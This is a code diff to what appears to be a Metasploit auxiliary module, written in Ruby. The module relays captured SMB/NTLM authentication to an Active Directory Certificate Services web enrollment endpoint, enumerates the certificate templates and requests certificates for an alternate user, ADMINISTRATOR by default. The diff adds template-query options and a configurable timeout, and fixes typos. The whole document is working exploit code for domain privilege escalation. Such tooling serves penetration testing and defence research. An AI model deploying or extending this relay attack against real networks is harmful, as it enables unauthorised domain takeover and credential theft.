@@ -27,12 +27,14 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),
-        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 445 ]),
-        OptString.new('CERT_URI', [ true, 'The URI for the cert server.', '/certsrv/' ]),
         OptString.new('ALT_USER', [ true, 'The user to issue the certificate for.', 'ADMINISTRATOR' ]),
         OptString.new('CERT_TEMPLATE', [ false, 'The user to issue the certificate for.', nil ]),
-        OptInt.new('TIMEOUT', [ true, 'Seconds that the server socket will wait for a response after the client has initiated communication.', 5])
+        OptString.new('CERT_URI', [ true, 'The URI for the cert server.', '/certsrv/' ]),
+        OptBool.new('QUERY_TEMPLATES', [ true, 'Query certificate templates and print them before attempting to use them', true ]),
+        OptBool.new('QUERY_ONLY', [ true, 'Only use the relay to get a list of templates; do not generate certificates.', false ]),
+        OptAddress.new('SRVHOST', [ true, 'The local host to listen on.', '0.0.0.0' ]),
+        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 445 ]),
+        OptInt.new('TIMEOUT', [ true, 'Seconds to wait for a response.', 20])
       ]
     )
 
@@ -56,6 +58,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def on_client_connect(_client)
     @login_uri = "#{datastore['CERT_URI']}/csertfnsh.asp"
+    @http_timeout = datastore['TIMEOUT']
     print_good('Received SMB connection on Auth Capture Server!')
   end
 
@@ -80,25 +83,38 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def post_login_action(client_socket, _opts = {})
-    print_status('Querying certificate templates; this may take some time')
-    cert_list = get_cert_list(client_socket)
-    return false if cert_list.nil?
-
-    print_status('Available Certificates:')
-    cert_list.each do |cert_entry|
-      print_status(cert_entry)
-    end
-
-    if cert_list.include?(datastore['CERT_TEMPLATE'])
-      retrieve_cert(client_socket, datastore['CERT_TEMPLATE'], datastore['alt_user'])
-    else
-      print_bad("#{datastore['CERT_TEMPLATE']} not found in available certificates") unless datastore['CERT_TEMPLATE'].nil?
-      print_status('Attempting to generate certificates for all templates')
-      cert_list.each do |cert_entry|
-        retrieve_cert(client_socket, cert_entry, datastore['alt_user'])
+    cert_list = nil
+    if datastore['QUERY_TEMPLATES']
+      print_status('Querying certificate templates; this may take some time')
+      cert_list = get_cert_list(client_socket)
+      if cert_list.nil?
+        print_bad('Could not query Cert List')
+      else
+        print_status('Available Certificates:')
+        cert_list.each do |cert_entry|
+          print_status(cert_entry)
+        end
       end
     end
-    return true
+    unless datastore['QUERY_ONLY']
+      if cert_list.nil? || cert_list.include?(datastore['CERT_TEMPLATE'])
+        # if we don't have a cert list or if the cert is in the list, just generate that cert
+        retrieve_cert(client_socket, datastore['CERT_TEMPLATE'], datastore['alt_user'])
+      else
+        # if we have a cert list and the desired template is not there
+        # or the desired template is nil, just issue all available certs
+        print_bad("#{datastore['CERT_TEMPLATE']} not found in available certificates") unless datastore['CERT_TEMPLATE'].nil?
+        print_status('Attempting to generate certificates for all templates')
+        cert_list.each do |cert_entry|
+          retrieve_cert(client_socket, cert_entry, datastore['alt_user'])
+        end
+      end
+    end
+  rescue Exception => e
+    print_error(e.to_s)
+    elog("Error querying certificates:\n #{e}")
+    raise e
+    return nil
   end
 
   def get_cert_list(client_socket)
@@ -108,7 +124,7 @@ class MetasploitModule < Msf::Auxiliary
         'uri' => "#{datastore['CERT_URI']}/certrqxt.asp"
       }
     )
-    res = client_socket._send_recv(req, 20, true)
+    res = client_socket._send_recv(req, @http_timeout, true)
     raw_list = res.body.scan(/^.*Option Value="E;(.*?);/)
     user_list = []
     raw_list.each do |element|
@@ -143,12 +159,12 @@ class MetasploitModule < Msf::Auxiliary
           }
         }
       )
-      res = client_socket._send_recv(req, 20, true)
+      res = client_socket._send_recv(req, @http_timeout, true)
       vprint_status('Post Sent')
       if res&.code == 200 && !res.body.include?('request was denied')
-        print_good("Certificate Request Granted using template #{cert_template} and uer #{alt_user}")
+        print_good("Certificate Request Granted using template #{cert_template} and user #{alt_user}")
       else
-        print_bad("Certificate Request Denied using template #{cert_template} and uer #{alt_user}")
+        print_bad("Certificate Request Denied using template #{cert_template} and user #{alt_user}")
         return false
       end
     rescue Exception => e
@@ -168,7 +184,7 @@ class MetasploitModule < Msf::Auxiliary
           'uri' => location_uri
         }
       )
-      res = client_socket._send_recv(req, 20, true)
+      res = client_socket._send_recv(req, @http_timeout, true)
       info = nil
       certificate = OpenSSL::X509::Certificate.new(res.body)
       pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
